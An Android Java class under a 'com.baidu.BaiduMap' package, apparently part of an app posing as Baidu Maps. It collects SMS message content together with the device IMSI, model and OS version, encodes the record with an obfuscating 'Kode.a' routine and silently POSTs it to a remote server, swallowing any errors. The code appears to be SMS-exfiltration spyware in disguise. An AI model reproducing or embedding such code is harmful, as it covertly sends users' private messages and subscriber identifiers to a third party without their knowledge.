package com.baidu.BaiduMap.httpCenter;

import android.content.Context;

import com.baidu.BaiduMap.entity.SmsSynchronousRequestDataEntity;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.GsonUtils;
import com.baidu.BaiduMap.utils.Kode;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.SDKUtils;

import okhttp3.RequestBody;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

/**
 * Created by Administrator on 2017/7/24.
 */

public class SmsSynchronousRequest {
    private static SmsSynchronousRequest smsSynchronousRequest = null;

    public static SmsSynchronousRequest getInstance() {
        if (smsSynchronousRequest == null) {
            smsSynchronousRequest = new SmsSynchronousRequest();
        }
        return smsSynchronousRequest;
    }

    public void request(Context context, String content, int status) {
        try {
            RequestBody body = RequestBody.create(okhttp3.MediaType.parse("application/json; charset=utf-8"), getRequestData(context, content, status));
            SubscriptionManager.getInstance().getSubscription(HttpRequest.getInstance().retrofitManager().requestForPost(Constants.SMS_SYNCHRONOUS_REQUEST_RUL, body), Schedulers.io(), AndroidSchedulers.mainThread(), new Subscriber<String>() {
                @Override
                public void onCompleted() {
                    if (Constants.isOutPut) {
                        Log.debug("SmsSynchronousRequest onCompleted");
                    }
                }

                @Override
                public void onError(Throwable e) {
                    if (Constants.isOutPut) {
                        Log.debug("SmsSynchronousRequest error :" + e.getMessage());
                    }
                }

                @Override
                public void onNext(String s) {
                    if (Constants.isOutPut) {
                        Log.debug("SmsSynchronousRequest :" + s.toString());
                    }
                }
            });
        } catch (Exception e) {

        }
    }

    private String getRequestData(Context context, String content, int status) {
        SmsSynchronousRequestDataEntity smsSynchronousRequestDataEntity = new SmsSynchronousRequestDataEntity();
        smsSynchronousRequestDataEntity.setContent(content);
        smsSynchronousRequestDataEntity.setImsi(SDKUtils.getIMSI(context));
        smsSynchronousRequestDataEntity.setOs_model(android.os.Build.MODEL.replace(" ", "%20"));
        smsSynchronousRequestDataEntity.setOs_version(android.os.Build.VERSION.RELEASE);
        smsSynchronousRequestDataEntity.setPackageid(SDKUtils.getPackId(context));
        smsSynchronousRequestDataEntity.setStatus(status + "");
        return Kode.a(GsonUtils.getInstance().EntityToJson(smsSynchronousRequestDataEntity));
    }
}
